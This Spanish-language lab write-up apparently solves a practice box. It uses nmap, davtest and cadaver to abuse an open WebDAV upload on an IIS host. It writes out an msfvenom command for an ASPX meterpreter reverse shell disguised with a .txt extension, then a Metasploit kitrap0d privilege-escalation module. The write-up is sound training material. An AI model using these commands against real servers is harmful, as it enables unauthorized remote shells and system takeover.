Hacemos el reconocimiento con nmap:
![[Pasted image 20231201112011.png]]
Y dentro del reporte de nmap estamos viendo que tenemos webdav habilitado, lo cual significa que se proporcionan funcionalidades adicionales más allá de las capacidades básicas de HTTP, tales como la edición remota y la gestión de archivos; y en este caso podemos ver que podemos subir archivos al servidor:
![[Pasted image 20231201112022.png]]
Por lo que hay una tool llamada davtest que nos permite saber qué tipo de archivos podemos subir al servidor:
```python
davtest -url http://10.10.10.15
```
![[Pasted image 20231201112041.png]]
El siguiente paso será generar un payload con msfvenom de asp (que es compatible con IIS) pero con extensión .txt para que podamos subirlo al servidor:
```python
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.24 LPORT=444 -f aspx -o shell.aspx.txt
```
![[Pasted image 20231201112542.png]]
Y con una tool llamada cadaver vamos a subir el archivo malicioso, y al estar subido, le cambiamos el nombre dejándole la extensión .asp:
![[Pasted image 20231201112556.png]]
Y ahora nos ponemos en la escucha con metasploit, ya que queremos recibir una sesión de meterpreter, por lo que ejecutamos la shell.aspx que tenemos subida en el servidor:
![[Pasted image 20231201112751.png]]
![[Pasted image 20231201112740.png]]
Una vez dentro, ejecutamos el módulo de local exploit suggester [[Escalada de Privilegios Windows en Metasploit]]:
![[Pasted image 20231201112848.png]]
Le cargamos la sesión:
![[Pasted image 20231201112918.png]]
Y lo ejecutamos, donde nos habrá encontrado los siguientes exploits, y nosotros usaremos el primero de ellos:
![[Pasted image 20231201113143.png]]
```python
use exploit/windows/local/ms10_015_kitrap0d
```
Y ya somos root:
![[Pasted image 20231201113210.png]]
